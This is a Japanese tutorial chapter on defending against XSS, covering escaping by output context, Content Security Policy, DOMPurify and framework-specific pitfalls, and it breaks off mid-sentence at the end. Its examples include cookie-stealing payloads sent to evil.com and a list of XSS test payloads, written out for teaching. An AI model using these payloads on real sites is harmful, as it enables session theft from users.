# XSS対策

> Reflected、Stored、DOM-based XSSの各攻撃手法を理解し、エスケープ、CSP、サニタイゼーションによる多層防御を実装する。

## 前提知識

- HTML/JavaScript の基本（DOM操作、イベントハンドラ）
- HTTP リクエスト/レスポンスの基礎
- Same-Origin Policy の基本概念
- Cookie の仕組み（[02-csrf-clickjacking.md](./02-csrf-clickjacking.md)）

## この章で学ぶこと

1. **3種類のXSS**（Reflected/Stored/DOM-based）の攻撃メカニズムと違いを理解する
2. **コンテキスト別エスケープ**とサニタイゼーションの正しい実装方法を習得する
3. **Content Security Policy（CSP）**による効果的な防御戦略を身につける
4. **Mutation XSS（mXSS）**などの高度な攻撃手法を認識する
5. **フレームワーク固有の注意点**と安全なコーディングパターンを習得する

---

## 1. XSS（Cross-Site Scripting）とは

XSSは、攻撃者が悪意のあるスクリプトをWebページに挿入し、他のユーザーのブラウザ上で実行させる攻撃である。OWASP Top 10 2021 では A03:2021-Injection に含まれ、最も頻繁に発見されるWeb脆弱性の一つである。

### 1.1 XSS攻撃で可能なこと

```
XSS攻撃の影響範囲:

  +---------------------------+----------------------------------------+
  | 攻撃の種類                | 影響                                    |
  +---------------------------+----------------------------------------+
  | Cookie/セッション窃取      | document.cookie の読み取り               |
  | キーストロークロギング     | キー入力の傍受（パスワード等）            |
  | フィッシング              | ページ内容の改ざん（偽ログインフォーム）    |
  | マルウェア配布             | ドライブバイダウンロード                  |
  | ワーム拡散                | 自己複製型XSS（Samy Worm等）            |
  | 暗号通貨マイニング         | ブラウザのCPUリソースを不正利用            |
  | 内部ネットワークスキャン   | ブラウザを踏み台にした内部探索            |
  | CSRF攻撃のバイパス        | CSRFトークンの読み取り → CSRF実行         |
  +---------------------------+----------------------------------------+
```

```
XSS攻撃の基本フロー:

  攻撃者                    Webサーバー                 被害者
    |                          |                        |
    |-- 悪意のあるスクリプト -->|                        |
    |   を注入                 |                        |
    |                          |-- スクリプト入りの  --> |
    |                          |   ページを配信         |
    |                          |                        |-- ブラウザで
    |                          |                        |   スクリプト実行
    |<--- Cookie/セッション ---|------------------------|
    |     情報を窃取           |                        |
```

### 1.2 XSSとSame-Origin Policyの関係

```
Same-Origin Policy (SOP) と XSS:

  SOPはブラウザのセキュリティモデルの基盤:
  - あるオリジン (scheme + host + port) のスクリプトは
    同じオリジンのリソースにのみアクセスできる

  XSSが危険な理由:
  - XSSで注入されたスクリプトは被害者のオリジンで実行される
  - → SOPの制約を受けない（同一オリジンとみなされる）
  - → Cookie、DOM、ローカルストレージ等に自由にアクセス可能

  例:
  正規のスクリプト: https://bank.com/app.js
    → bank.com の Cookie にアクセス可能 (SOP OK)

  XSSで注入されたスクリプト: <script>alert(document.cookie)</script>
    → bank.com のページで実行される
    → bank.com の Cookie にアクセス可能 (SOP OK, XSSだから!)
```

---

## 2. XSSの3つの種類

### 2.1 Reflected XSS（反射型）

リクエストパラメータに含まれたスクリプトがレスポンスにそのまま反映される。攻撃者は被害者に悪意のあるURLをクリックさせる必要がある。

```python
# コード例1: Reflected XSSの脆弱なコードと対策

# 脆弱なコード
@app.route("/search")
def search_vulnerable():
    query = request.args.get("q", "")
    # ユーザー入力をそのままHTMLに埋め込む -> XSS!
    return f"<h1>検索結果: {query}</h1>"
    # /search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>

# 安全なコード
from markupsafe import escape

@app.route("/search")
def search_safe():
    query = request.args.get("q", "")
    # HTMLエスケープを適用
    return f"<h1>検索結果: {escape(query)}</h1>"
    # <script> -> &lt;script&gt; に変換される

# さらに安全: テンプレートエンジンの自動エスケープ
from flask import render_template

@app.route("/search")
def search_best():
    query = request.args.get("q", "")
    # Jinja2はデフォルトで自動エスケープ
    return render_template("search.html", query=query)
```

```
Reflected XSS の攻撃シナリオ:

  攻撃者 → メール送信: "こちらをクリックして確認してください"
    URL: https://bank.com/search?q=<script>
         fetch('https://evil.com/steal?cookie='+document.cookie)
         </script>

  被害者 → URL をクリック
    ↓
  bank.com → リクエストを受信
    ↓
  bank.com → レスポンスに q パラメータの値をそのまま含む
    ↓
  被害者のブラウザ → スクリプトを実行
    ↓
  被害者の Cookie が evil.com に送信される
```

### 2.2 Stored XSS（格納型）

悪意のあるスクリプトがデータベース等に保存され、他のユーザーがアクセスした際に実行される。最も危険なXSSタイプ。

```python
# コード例2: Stored XSSの脆弱なコードと対策

# 脆弱なコード: コメント投稿
@app.route("/comments", methods=["POST"])
def post_comment_vulnerable():
    comment = request.form["comment"]
    # そのまま保存 -> 表示時にXSSが発生
    db.execute("INSERT INTO comments (body) VALUES (?)", (comment,))
    return redirect("/comments")

# 安全なコード: サニタイゼーション + エスケープ
import bleach

ALLOWED_TAGS = ["b", "i", "u", "a", "p", "br", "ul", "ol", "li", "blockquote"]
ALLOWED_ATTRS = {"a": ["href", "title"]}
ALLOWED_PROTOCOLS = ["http", "https", "mailto"]

@app.route("/comments", methods=["POST"])
def post_comment_safe():
    comment = request.form["comment"]
    # HTMLサニタイゼーション: 許可されたタグ以外を除去
    clean_comment = bleach.clean(
        comment,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRS,
        protocols=ALLOWED_PROTOCOLS,
        strip=True,
    )
    db.execute("INSERT INTO comments (body) VALUES (?)", (clean_comment,))
    return redirect("/comments")
```

```
Stored XSS の影響が大きい理由:

  Reflected XSS:
  - 攻撃者が被害者に特定のURLをクリックさせる必要がある
  - 1人の被害者を攻撃するのに1回の誘導が必要

  Stored XSS:
  - 攻撃コードがDBに保存される
  - そのページにアクセスした全ユーザーが被害を受ける
  - 管理者がアクセスすれば管理者権限も奪取可能
  - ワーム型（自己複製型）攻撃が可能

  実例: Samy Worm (2005)
  - MySpaceのプロフィールページにStored XSSを設置
  - 閲覧したユーザーのプロフィールに自動でワームをコピー
  - 20時間で100万人以上に感染
```

### 2.3 DOM-based XSS

サーバーを経由せず、クライアントサイドのJavaScriptがDOMを安全でない方法で操作することで発生する。

```javascript
// コード例3: DOM-based XSSの脆弱なコードと対策

// 脆弱なコード
// URLが: /page#<img src=x onerror=alert(1)> の場合にXSSが発生
const hash = location.hash.substring(1);
document.getElementById("content").innerHTML = hash; // 危険!

// 安全なコード: textContentを使用
const hash2 = location.hash.substring(1);
document.getElementById("content").textContent = hash2; // HTMLとして解釈されない

// 安全なコード: DOMPurifyでサニタイズ
import DOMPurify from "dompurify";

const hash3 = location.hash.substring(1);
const clean = DOMPurify.sanitize(hash3);
document.getElementById("content").innerHTML = clean;
```

```
DOM-based XSS のソースとシンク:

  ソース（攻撃者が制御可能な入力）:
  +-------------------------------+
  | location.href                 |
  | location.hash                 |
  | location.search               |
  | document.referrer             |
  | document.cookie               |
  | window.name                   |
  | Web Storage (localStorage)    |
  | postMessage のデータ           |
  +-------------------------------+

  シンク（XSSが発生する出力先）:
  +-------------------------------+-----------------------------+
  | innerHTML                     | HTMLとして解釈される         |
  | outerHTML                     | HTMLとして解釈される         |
  | document.write()              | HTMLとして解釈される         |
  | eval()                        | JSとして実行される           |
  | setTimeout(string)            | JSとして実行される           |
  | setInterval(string)           | JSとして実行される           |
  | Function(string)              | JSとして実行される           |
  | element.src                   | リソース読み込み             |
  | element.href                  | ナビゲーション               |
  | jQuery.html()                 | HTMLとして解釈される         |
  | jQuery.append()               | HTMLとして解釈される         |
  +-------------------------------+-----------------------------+

  安全な代替:
  +-------------------------------+-----------------------------+
  | textContent (= innerText)     | テキストとして扱われる       |
  | setAttribute()                | 属性値として安全に設定       |
  | createElement() + appendChild()| DOMノードとして安全に追加   |
  +-------------------------------+-----------------------------+
```

### 2.4 XSSタイプ比較表

| 種類 | 保存場所 | 攻撃経路 | 影響範囲 | 検出難度 | サーバーログ |
|------|---------|---------|---------|---------|-----------|
| Reflected | なし（レスポンスに反映） | URL/フォーム | リンクを踏んだユーザー | 中 | あり |
| Stored | DB/ファイル | アプリケーション内 | ページにアクセスした全ユーザー | 低 | 保存時のみ |
| DOM-based | なし（クライアント側） | URL Fragment等 | リンクを踏んだユーザー | 高 | なし（#以降はサーバーに送信されない） |

---

## 3. コンテキスト別エスケープ

XSSを防ぐには、データを出力する**コンテキスト**に応じた適切なエスケープが必要である。間違ったコンテキストのエスケープを使うと防御が無効になる。

### 3.1 出力コンテキストの分類

```
出力コンテキストとエスケープ方法:

  +------------------+------------------------------+----------------------+
  | コンテキスト     | エスケープ方法                | 例                    |
  +------------------+------------------------------+----------------------+
  | HTMLボディ        | &lt; &gt; &amp; &quot; &#x27;| <p>{{user_input}}</p>|
  +------------------+------------------------------+----------------------+
  | HTML属性          | HTML属性エスケープ            | <div title="{{..}}"> |
  +------------------+------------------------------+----------------------+
  | JavaScript       | JavaScriptエスケープ (\xHH)   | var x = "{{..}}";    |
  +------------------+------------------------------+----------------------+
  | URL              | URLエンコード (%HH)           | <a href="/s?q={{..}}">|
  +------------------+------------------------------+----------------------+
  | CSS              | CSSエスケープ (\HHHHHH)       | color: {{..}};       |
  +------------------+------------------------------+----------------------+

  重要: コンテキストの入れ子に注意!

  <a href="javascript:alert('{{user_input}}')">
  → URL コンテキスト内の JavaScript コンテキスト
  → 最も安全な方法: javascript: URLを完全に禁止する
```

```python
# コード例4: コンテキスト別エスケープの実装
import html
import json
from urllib.parse import quote

class XSSEncoder:
    """コンテキスト別のエスケープ処理

    各メソッドは特定のHTMLコンテキストに対応する。
    間違ったコンテキストのエスケープを使うとXSSが発生するため、
    出力先に応じた正しいメソッドを選択すること。
    """

    @staticmethod
    def html_encode(s: str) -> str:
        """HTMLコンテキスト用エスケープ

        対象: <p>{{ここ}}</p>, <div>{{ここ}}</div>
        変換: < > & " ' → &lt; &gt; &amp; &quot; &#x27;
        """
        return html.escape(s, quote=True)

    @staticmethod
    def js_encode(s: str) -> str:
        """JavaScriptコンテキスト用エスケープ

        対象: var x = "{{ここ}}";
        変換: JSON.dumpsで安全な文字列リテラルを生成
        注意: <script>タグ内に出力する場合、</script> を含む
              文字列がスクリプトを早期終了させる可能性がある
        """
        # JSON.dumps で安全なJSリテラルに変換
        encoded = json.dumps(s)
        # </script> によるスクリプトブロック終了を防止
        encoded = encoded.replace("</", "<\\/")
        return encoded

    @staticmethod
    def url_encode(s: str) -> str:
        """URLコンテキスト用エスケープ

        対象: <a href="/search?q={{ここ}}">
        変換: 英数字以外を %HH 形式にエンコード
        """
        return quote(s, safe="")

    @staticmethod
    def attr_encode(s: str) -> str:
        """HTML属性用エスケープ

        対象: <div title="{{ここ}}">
        変換: 英数字以外をHTML文字参照に変換
        注意: 属性値は必ずクォートで囲むこと
        """
        result = []
        for ch in s:
            if ch.isalnum():
                result.append(ch)
            else:
                result.append(f"&#x{ord(ch):02x};")
        return "".join(result)

    @staticmethod
    def css_encode(s: str) -> str:
        """CSSコンテキスト用エスケープ

        対象: <style> .class { color: {{ここ}}; } </style>
        変換: 英数字以外を \\HHHHHH 形式にエスケープ
        """
        result = []
        for ch in s:
            if ch.isalnum():
                result.append(ch)
            else:
                result.append(f"\\{ord(ch):06x}")
        return "".join(result)

encoder = XSSEncoder()

# 使用例
user_input = '<script>alert("XSS")</script>'

# HTMLコンテキスト
safe_html = f"<p>{encoder.html_encode(user_input)}</p>"
# => <p>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</p>

# JavaScriptコンテキスト
safe_js = f"var name = {encoder.js_encode(user_input)};"
# => var name = "<script>alert(\"XSS\")<\/script>";

# URLコンテキスト
safe_url = f"/search?q={encoder.url_encode(user_input)}"
# => /search?q=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E
```

### 3.2 危険なコンテキスト（エスケープでは不十分な場所）

```
エスケープだけでは不十分なコンテキスト:

  1. javascript: URL:
     <a href="javascript:{{user_input}}">
     → どんなエスケープをしても安全にできない
     → 対策: javascript: で始まるURLを完全にブロック

  2. イベントハンドラ:
     <div onmouseover="{{user_input}}">
     → HTMLデコード → JS実行の二段階で危険
     → 対策: イベントハンドラ属性にユーザー入力を入れない

  3. CSS expression (IE):
     <div style="background: expression({{user_input}})">
     → CSSからJSを実行できる（旧IE）
     → 対策: style属性にユーザー入力を入れない

  4. <script>タグの内部:
     <script>var x = "{{user_input}}";</script>
     → </script> で早期終了させて別のスクリプトを挿入可能
     → 対策: JSONとして外部ファイルに出力するか、
              data-属性に入れてJSから読み取る

  推奨パターン:
  <div id="data" data-user-name="{{html_encode(user_input)}}"></div>
  <script>
    const name = document.getElementById('data').dataset.userName;
  </script>
```

---

## 4. Content Security Policy（CSP）

CSPは、ブラウザにスクリプトやリソースの読み込み元を制限させるセキュリティヘッダーである。XSSの影響を大幅に軽減する「最後の砦」として機能する。

### 4.1 CSPの動作原理

```
CSPの動作原理:

  サーバー                           ブラウザ
    |                                  |
    |-- CSPヘッダー付きレスポンス -->   |
    |   Content-Security-Policy:       |
    |   script-src 'self'              |
    |                                  |
    |                                  |-- 自サイトの.jsファイル
    |                                  |   => 実行許可 ✓
    |                                  |
    |                                  |-- <script>alert(1)</script>
    |                                  |   => ブロック ✗ (インラインスクリプト)
    |                                  |
    |                                  |-- <script src="evil.com/x.js">
    |                                  |   => ブロック ✗ (外部ドメイン)
    |                                  |
    |                                  |-- CSP違反をレポート
    |                                  |   → report-uri に送信
```

### 4.2 CSPディレクティブの詳細

```
主要なCSPディレクティブ:

  +---------------------+---------------------------------------------+
  | ディレクティブ       | 制御対象                                    |
  +---------------------+---------------------------------------------+
  | default-src         | 他のディレクティブのフォールバック             |
  | script-src          | <script> タグ、インラインスクリプト           |
  | style-src           | <style> タグ、インラインスタイル              |
  | img-src             | <img> タグ                                  |
  | font-src            | @font-face によるフォント読み込み             |
  | connect-src         | fetch / XHR / WebSocket の接続先            |
  | frame-src           | <iframe> の読み込み元                        |
  | frame-ancestors     | このページを <iframe> で読み込めるオリジン     |
  | media-src           | <video> / <audio> タグ                      |
  | object-src          | <object> / <embed> / <applet>               |
  | base-uri            | <base> タグの href                           |
  | form-action         | <form> の action 属性                        |
  | report-uri          | CSP違反レポートの送信先                       |
  | report-to           | CSP違反レポートの送信先（新仕様）              |
  +---------------------+---------------------------------------------+

  ソース値:
  +---------------------+---------------------------------------------+
  | 'self'              | 同一オリジンのみ                             |
  | 'none'              | 全てブロック                                  |
  | 'unsafe-inline'     | インラインスクリプト/スタイルを許可（非推奨）   |
  | 'unsafe-eval'       | eval() を許可（非推奨）                       |
  | 'nonce-{random}'    | 指定されたnonceを持つスクリプトのみ許可         |
  | 'strict-dynamic'    | nonceで許可されたスクリプトが読み込む          |
  |                     | スクリプトも自動的に許可                       |
  | https:              | HTTPS経由のリソースのみ                       |
  | data:               | data: URLを許可                              |
  | blob:               | blob: URLを許可                              |
  | *.example.com       | サブドメインのワイルドカード                   |
  +---------------------+---------------------------------------------+
```

```python
# コード例5: CSPの段階的導入
import secrets

class CSPBuilder:
    """Content Security Policyの構築ヘルパー"""

    def __init__(self):
        self.directives = {}

    def add_directive(self, directive: str, *sources: str) -> 'CSPBuilder':
        self.directives.setdefault(directive, []).extend(sources)
        return self

    def build(self) -> str:
        parts = []
        for directive, sources in self.directives.items():
            parts.append(f"{directive} {' '.join(sources)}")
        return "; ".join(parts)

    def build_report_only(self) -> dict:
        """レポートオンリーモード（まず監視から開始）"""
        return {
            "Content-Security-Policy-Report-Only": self.build()
        }

    def build_enforced(self) -> dict:
        """強制モード"""
        return {
            "Content-Security-Policy": self.build()
        }

# 段階的CSP導入
# Step 1: レポートオンリーで影響を確認
csp_step1 = (CSPBuilder()
    .add_directive("default-src", "'self'")
    .add_directive("script-src", "'self'", "'unsafe-inline'")  # 一時的に許可
    .add_directive("style-src", "'self'", "'unsafe-inline'")
    .add_directive("report-uri", "/csp-report")
)

# Step 2: インラインスクリプトをnonce化
nonce = secrets.token_urlsafe(32)
csp_step2 = (CSPBuilder()
    .add_directive("default-src", "'self'")
    .add_directive("script-src", "'self'", f"'nonce-{nonce}'")
    .add_directive("style-src", "'self'", f"'nonce-{nonce}'")
    .add_directive("img-src", "'self'", "data:", "https:")
    .add_directive("connect-src", "'self'", "https://api.example.com")
    .add_directive("frame-ancestors", "'none'")
    .add_directive("report-uri", "/csp-report")
)

# Step 3: 最も厳格なCSP (strict-dynamic)
csp_strict = (CSPBuilder()
    .add_directive("default-src", "'none'")
    .add_directive("script-src", "'self'", "'strict-dynamic'",
                   f"'nonce-{nonce}'")
    .add_directive("style-src", "'self'", f"'nonce-{nonce}'")
    .add_directive("img-src", "'self'")
    .add_directive("font-src", "'self'")
    .add_directive("connect-src", "'self'")
    .add_directive("frame-ancestors", "'none'")
    .add_directive("base-uri", "'self'")
    .add_directive("form-action", "'self'")
)
```

### 4.3 Nonceベース CSPの実装

```python
# コード例6: Flask での Nonce ベース CSP 実装
from flask import Flask, request, g, render_template
import secrets

app = Flask(__name__)

@app.before_request
def generate_nonce():
    """リクエストごとにユニークなnonceを生成"""
    g.csp_nonce = secrets.token_urlsafe(32)

@app.after_request
def add_csp_header(response):
    """CSPヘッダーを設定"""
    nonce = g.get('csp_nonce', '')
    csp = (
        f"default-src 'none'; "
        f"script-src 'self' 'nonce-{nonce}' 'strict-dynamic'; "
        f"style-src 'self' 'nonce-{nonce}'; "
        f"img-src 'self' data: https:; "
        f"font-src 'self'; "
        f"connect-src 'self'; "
        f"frame-ancestors 'none'; "
        f"base-uri 'self'; "
        f"form-action 'self'; "
        f"report-uri /csp-report"
    )
    response.headers['Content-Security-Policy'] = csp
    return response

@app.context_processor
def inject_nonce():
    """テンプレートにnonceを注入"""
    return {'csp_nonce': g.get('csp_nonce', '')}

# テンプレート (template.html):
# <script nonce="{{ csp_nonce }}">
#   // このスクリプトは実行される（nonceが一致するため）
#   console.log("Safe inline script");
# </script>
#
# <script>
#   // このスクリプトはブロックされる（nonceがないため）
#   alert("This will be blocked by CSP");
# </script>
```

### 4.4 CSP違反レポートの処理

```python
# コード例7: CSP違反レポートの受信と分析
from flask import Flask, request, jsonify
import json
import logging

app = Flask(__name__)
logger = logging.getLogger("csp_reports")

@app.route("/csp-report", methods=["POST"])
def csp_report():
    """CSP違反レポートを受信"""
    try:
        report = json.loads(request.data)
        csp_report = report.get("csp-report", {})

        # レポートの内容を記録
        logger.warning(
            "CSP Violation: "
            f"blocked-uri={csp_report.get('blocked-uri', 'unknown')}, "
            f"violated-directive={csp_report.get('violated-directive', 'unknown')}, "
            f"document-uri={csp_report.get('document-uri', 'unknown')}, "
            f"source-file={csp_report.get('source-file', 'unknown')}, "
            f"line-number={csp_report.get('line-number', 'unknown')}"
        )

        # 重大な違反をアラート
        violated = csp_report.get("violated-directive", "")
        if "script-src" in violated:
            # スクリプト実行の違反 → XSS攻撃の可能性
            alert_security_team(csp_report)

        return "", 204
    except Exception as e:
        logger.error(f"Failed to process CSP report: {e}")
        return "", 400

def alert_security_team(report: dict):
    """セキュリティチームにアラート送信"""
    # Slack, PagerDuty, etc. への通知
    pass
```

---

## 5. DOMPurify によるサニタイゼーション

```javascript
// コード例8: DOMPurify の詳細な設定
import DOMPurify from "dompurify";

// === 基本的な使用 ===
const dirty = '<img src=x onerror=alert(1)//>';
const clean = DOMPurify.sanitize(dirty);
// => '<img src="x">' (onerror属性が除去される)

// === カスタム設定 ===
const config = {
    // 許可するタグ
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br',
                   'ul', 'ol', 'li', 'h1', 'h2', 'h3',
                   'blockquote', 'code', 'pre'],

    // 許可する属性
    ALLOWED_ATTR: ['href', 'title', 'class'],

    // javascript: URL を禁止
    ALLOW_DATA_ATTR: false,

    // <a> タグに target="_blank" と rel="noopener" を自動追加
    ADD_ATTR: ['target'],

    // 全てのリンクに rel="noopener noreferrer" を追加
    WHOLE_DOCUMENT: false,

    // SVGタグを許可するか
    USE_PROFILES: {svg: false, svgFilters: false, mathMl: false},
};

const cleanHtml = DOMPurify.sanitize(userHtml, config);

// === フック機能 ===
// サニタイズ中にカスタム処理を追加
DOMPurify.addHook('afterSanitizeAttributes', function(node) {
    // 全ての <a> タグに target="_blank" と rel="noopener" を追加
    if (node.tagName === 'A') {
        node.setAttribute('target', '_blank');
        node.setAttribute('rel', 'noopener noreferrer');
    }
    // 画像のsrcをプロキシ経由に変更
    if (node.tagName === 'IMG' && node.getAttribute('src')) {
        const originalSrc = node.getAttribute('src');
        node.setAttribute('src', `/proxy/image?url=${encodeURIComponent(originalSrc)}`);
    }
});

// === Trusted Types との統合 ===
// ブラウザの Trusted Types API と連携
if (window.trustedTypes && window.trustedTypes.createPolicy) {
    const policy = trustedTypes.createPolicy('default', {
        createHTML: (input) => DOMPurify.sanitize(input, config),
    });
}
```

---

## 6. フレームワーク別の組み込み対策

### 6.1 フレームワーク比較

| フレームワーク | 自動エスケープ | CSP対応 | 注意点 |
|---------------|:----------:|:------:|------|
| React | `{}` で自動エスケープ | Helmet | `dangerouslySetInnerHTML` に注意 |
| Angular | デフォルトでサニタイズ | 組み込み | `bypassSecurityTrust*` に注意 |
| Vue.js | `{{ }}` で自動エスケープ | 手動 | `v-html` に注意 |
| Django | テンプレートで自動エスケープ | middleware | `|safe` フィルタに注意 |
| Flask/Jinja2 | 自動エスケープ（有効時） | 手動 | `|safe` フィルタ、`Markup()` に注意 |
| Next.js | Reactの自動エスケープ | 設定ファイル | SSR時のXSSに注意 |

### 6.2 React での安全なレンダリング

```javascript
// コード例9: React での安全なレンダリング
import DOMPurify from "dompurify";

// 安全: JSXは自動でエスケープ
function SafeComponent({ userInput }) {
  return <div>{userInput}</div>; // HTMLとして解釈されない
}

// 安全: 属性値も自動エスケープ
function SafeAttribute({ userInput }) {
  return <div title={userInput}>Content</div>;
  // " が &#34; にエスケープされる
}

// 危険: dangerouslySetInnerHTMLは避ける
function DangerousComponent({ htmlContent }) {
  // どうしても必要な場合はDOMPurifyでサニタイズ
  const clean = DOMPurify.sanitize(htmlContent, {
    ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "br"],
    ALLOWED_ATTR: ["href", "title"],
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

// 危険: href属性にユーザー入力
function DangerousLink({ userUrl }) {
  // NG: javascript: URL でXSSが発生する
  // return <a href={userUrl}>Click</a>;

  // OK: プロトコルを検証
  const safeUrl = sanitizeUrl(userUrl);
  return <a href={safeUrl}>Click</a>;
}

function sanitizeUrl(url) {
  try {
    const parsed = new URL(url);
    if (['http:', 'https:', 'mailto:'].includes(parsed.protocol)) {
      return url;
    }
    return '#'; // 安全でないプロトコルはブロック
  } catch {
    return '#'; // 無効なURLはブロック
  }
}

// 安全: SSRでのデータ受け渡し
function ServerSideData({ serverData }) {
  // NG: <script>window.__DATA__ = {serverData}</script>
  // → XSSの危険性あり

  // OK: JSON.stringifyでエスケープしてdata属性に格納
  return (
    <div id="app-data"
         data-config={JSON.stringify(serverData)}>
    </div>
  );
}
```

### 6.3 Vue.js での安全なレンダリング

```javascript
// コード例10: Vue.js での安全なレンダリング

// 安全: マスタッシュ構文は自動エスケープ
// <template>
//   <p>{{ userInput }}</p>
//   <!-- <script>alert(1)</script> → &lt;script&gt;alert(1)&lt;/script&gt; -->
// </template>

// 危険: v-html はHTMLとして解釈される
// <template>
//   <div v-html="userHtml"></div>
//   <!-- XSSの危険あり -->
// </template>

// 安全: v-html + DOMPurify
import DOMPurify from 'dompurify';

export default {
  computed: {
    safeHtml() {
      return DOMPurify.sanitize(this.userHtml, {
        ALLOWED_TAGS: ['b', 'i', 'a', 'p', 'br'],
        ALLOWED_ATTR: ['href'],
      });
    }
  }
};
// <template>
//   <div v-html="safeHtml"></div>
// </template>

// Vue.js 用グローバルディレクティブ（v-safe-html）
// app.directive('safe-html', {
//   mounted(el, binding) {
//     el.innerHTML = DOMPurify.sanitize(binding.value);
//   },
//   updated(el, binding) {
//     el.innerHTML = DOMPurify.sanitize(binding.value);
//   }
// });
```

---

## 7. Mutation XSS（mXSS）

```
Mutation XSS (mXSS) とは:

  ブラウザのHTMLパーサーが入力を「修正」する過程で
  無害に見える入力が有害に変換される攻撃

  例:
  入力: <p><svg><style><img src=x onerror=alert(1)>

  サニタイザが処理:
    → <p>, <svg>, <style> は許可タグ
    → <img> は <style> の中なので実行されないと判断
    → 通過させる

  ブラウザが処理:
    → SVG の <style> 内のHTMLを再パースする
    → <img src=x onerror=alert(1)> が有効なHTMLとして解釈される
    → XSSが発生!

  対策:
  - DOMPurify を使用（mXSS への対策が組み込まれている）
  - 独自のサニタイザは mXSS に対して脆弱な場合が多い
  - Trusted Types API を導入
```

```
Trusted Types API:

  ブラウザネイティブのXSS対策:
  - innerHTML 等の危険なシンクへの代入を制御
  - 信頼されたポリシーを通じてのみHTML文字列を生成可能

  CSPで有効化:
  Content-Security-Policy: require-trusted-types-for 'script';
                           trusted-types dompurify default;

  JavaScript:
  // ポリシーを定義
  const policy = trustedTypes.createPolicy('dompurify', {
    createHTML: (input) => DOMPurify.sanitize(input),
  });

  // 使用（Trusted Types なしで innerHTML に代入するとエラー）
  element.innerHTML = policy.createHTML(userInput);
  // OK: DOMPurifyを通した安全なHTML

  element.innerHTML = userInput;
  // TypeError: This document requires 'TrustedHTML' assignment
```

---

## 8. エッジケース

### エッジケース1: 文字エンコーディングによるバイパス

```
UTF-7 XSS（古いブラウザ/設定）:

  Content-Type に charset が未指定の場合、
  古いIEはUTF-7として解釈する可能性があった

  入力: +ADw-script+AD4-alert(1)+ADw-/script+AD4-
  UTF-7デコード: <script>alert(1)</script>

  対策:
  - Content-Type ヘッダーに charset=utf-8 を常に指定
  - X-Content-Type-Options: nosniff を設定
  - <meta charset="UTF-8"> を HTML の先頭に配置
```

### エッジケース2: JSONレスポンスでのXSS

```
JSON レスポンスの XSS:

  レスポンス:
  Content-Type: application/json
  {"name": "<script>alert(1)</script>"}

  通常は安全（JSONはHTMLとして解釈されない）

  しかし以下の場合に危険:
  1. Content-Type が text/html に誤設定されている
  2. IE の Content-Type sniffing が有効
  3. JSONP で返している場合

  対策:
  - Content-Type: application/json を正しく設定
  - X-Content-Type-Options: nosniff を設定
  - JSONレスポンスの先頭に ")]}',\n" を付与（Angular方式）
  - JSON内の </ を \u003c\u002f にエスケープ
```

### エッジケース3: SVGファイルのXSS

```
SVG ファイルの XSS:

  SVG は XML ベースであり、<script> タグを含むことができる

  <svg xmlns="http://www.w3.org/2000/svg">
    <script>alert(document.cookie)</script>
  </svg>

  攻撃シナリオ:
  1. ユーザーが SVG ファイルをアップロード
  2. サーバーが SVG をそのまま配信
  3. 他のユーザーが SVG を閲覧 → XSS

  対策:
  - アップロードされた SVG の <script> タグを除去
  - SVG を別ドメイン（CDN等）から配信
  - Content-Disposition: attachment で表示を防止
  - SVG 内のイベントハンドラ（onclick等）を除去
  - <img src="uploaded.svg"> として読み込む
    （<img> 経由ではスクリプトは実行されない）
```

---

## 9. テスト手法

```python
# コード例11: XSS脆弱性のテスト
import requests
from typing import List, Dict

class XSSTester:
    """XSS脆弱性の基本テスト"""

    BASIC_PAYLOADS = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '"><script>alert(1)</script>',
        "'-alert(1)-'",
        '<details open ontoggle=alert(1)>',
        '<body onload=alert(1)>',
    ]

    ATTRIBUTE_PAYLOADS = [
        '" onmouseover="alert(1)',
        "' onmouseover='alert(1)",
        '" autofocus onfocus="alert(1)',
    ]

    DOM_PAYLOADS = [
        '#<img src=x onerror=alert(1)>',
        '#"><svg onload=alert(1)>',
    ]

    def test_reflected(self, url: str, param: str) -> List[Dict]:
        """Reflected XSS テスト"""
        results = []
        for payload in self.BASIC_PAYLOADS:
            response = requests.get(url, params={param: payload})
            reflected = payload in response.text
            encoded = any(
                enc in response.text
                for enc in [
                    payload.replace("<", "&lt;"),
                    payload.replace('"', "&quot;"),
                ]
            )
            results.append({
                "payload": payload,
                "reflected_raw": reflected,
                "properly_encoded": encoded,
                "vulnerable": reflected and not encoded,
            })
        return results

    def test_csp_headers(self, url: str) -> Dict:
        """CSPヘッダーの確認"""
        response = requests.get(url)
        csp = response.headers.get("Content-Security-Policy", "")
        csp_report = response.headers.get(
            "Content-Security-Policy-Report-Only", "")

        issues = []
        if not csp and not csp_report:
            issues.append("CSP header missing")
        if "'unsafe-inline'" in csp:
            issues.append("'unsafe-inline' in script-src")
        if "'unsafe-eval'" in csp:
            issues.append("'unsafe-eval' in script-src")
        if "default-src" not in csp and "script-src" not in csp:
            issues.append("No script-src or default-src directive")

        return {
            "csp": csp,
            "csp_report_only": csp_report,
            "issues": issues,
            "score": max(0, 100 - len(issues) * 25),
        }

# 使用例（必ず許可された環境でのみ）
# tester = XSSTester()
# results = tester.test_reflected("http://localhost:8080/search", "q")
```

---

## 10. パフォーマンスに関する考察

```
XSS対策のパフォーマンス影響:

  +-----------------------------+------------------+------------------+
  | 対策                        | サーバー側影響    | クライアント側影響 |
  +-----------------------------+------------------+------------------+
  | HTMLエスケープ               | ~0.01ms/処理     | なし              |
  | テンプレートエンジン         | ~0.1ms/レンダリング| なし             |
  | (自動エスケープ)            |                  |                  |
  +-----------------------------+------------------+------------------+
  | DOMPurify サニタイズ         | N/A              | ~1-5ms/処理      |
  | (クライアント側)            |                  | (HTMLサイズ依存)  |
  +-----------------------------+------------------+------------------+
  | CSP ヘッダー                | ~0.01ms          | パース: ~0.1ms   |
  |                             | (ヘッダー追加)    | 検証: ~0.01ms/   |
  |                             |                  |  リソース読み込み |
  +-----------------------------+------------------+------------------+
  | CSP nonce 生成              | ~0.05ms          | なし              |
  +-----------------------------+------------------+------------------+

  結論:
  - XSS対策のパフォーマンス影響はほぼ無視できるレベル
  - DOMPurify は巨大なHTMLに対しては数msかかるが許容範囲
  - CSP はブラウザのリソース読み込みを制限するため
